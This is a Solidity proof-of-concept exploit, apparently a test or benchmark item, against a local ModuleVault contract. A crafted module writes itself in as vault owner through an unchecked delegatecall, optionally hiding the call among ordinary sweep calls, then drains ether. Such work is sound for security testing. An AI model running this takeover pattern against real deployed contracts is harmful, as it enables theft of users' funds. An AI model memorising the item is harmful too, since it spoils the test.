// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {ModuleVault} from "../src/ModuleVault.sol";
import {SweepModule} from "../src/SweepModule.sol";

/// @notice Attack module. Its first storage variable lines up with the vault's first slot, where
///         the vault keeps its owner; run with `delegatecall`, `takeOver` overwrites it.
contract TakeoverModule {
    address private slot0;

    function takeOver(address newOwner) external {
        slot0 = newOwner;
    }
}

/// @notice Delegatecall to a caller-chosen module: the vault never checks its approval list.
/// Knobs:
///   0 `entry`       0 runs the attack module through `runUpkeep`, 1 through `runUpkeepBatch`;
///   1 `cover_runs`  for `runUpkeepBatch`, the number of ordinary sweeps placed before the attack
///                   module in the same batch;
///   2 `drain_bps`   the share of the vault's ether withdrawn after the takeover, in basis points.
contract ModuleVaultTakeoverPoC is AssayPoC {
    uint256 private constant BPS = 10_000;

    ModuleVault internal vault;
    SweepModule internal sweeper;

    function setUpTarget() internal override {
        address owner = makeAddr("owner");
        vm.deal(owner, 20 ether);
        vm.startPrank(owner);
        vault = new ModuleVault();
        (bool sent,) = address(vault).call{value: 15 ether}("");
        require(sent, "deposit failed");
        sweeper = new SweepModule(makeAddr("cold_storage"), 5 ether);
        vault.setModuleApproval(address(sweeper), true);
        vm.stopPrank();

        declareAttackerBalance(0, 0, 1 ether);
        declareKnob(0, "entry", 0, 0, 1);
        declareKnob(1, "cover_runs", 0, 0, 3);
        declareKnob(2, "drain_bps", BPS, 1, BPS);
    }

    function exploit() internal override {
        address ownerBefore = vault.owner();
        uint256 balanceBefore = attacker.balance;

        vm.startPrank(attacker);
        TakeoverModule module = new TakeoverModule();
        bytes memory takeOver = abi.encodeCall(TakeoverModule.takeOver, (attacker));
        if (knob(0) == 0) {
            vault.runUpkeep(address(module), takeOver);
        } else {
            uint256 cover = knob(1);
            address[] memory modules = new address[](cover + 1);
            bytes[] memory data = new bytes[](cover + 1);
            for (uint256 i = 0; i < cover; i++) {
                modules[i] = address(sweeper);
                data[i] = abi.encodeCall(SweepModule.sweep, ());
            }
            modules[cover] = address(module);
            data[cover] = takeOver;
            vault.runUpkeepBatch(modules, data);
        }
        vault.withdraw(payable(attacker), address(vault).balance * knob(2) / BPS);
        vm.stopPrank();

        unauthorized_role_change("owner", ownerBefore, vault.owner());
        attacker_profit("eth", balanceBefore, attacker.balance);
    }
}
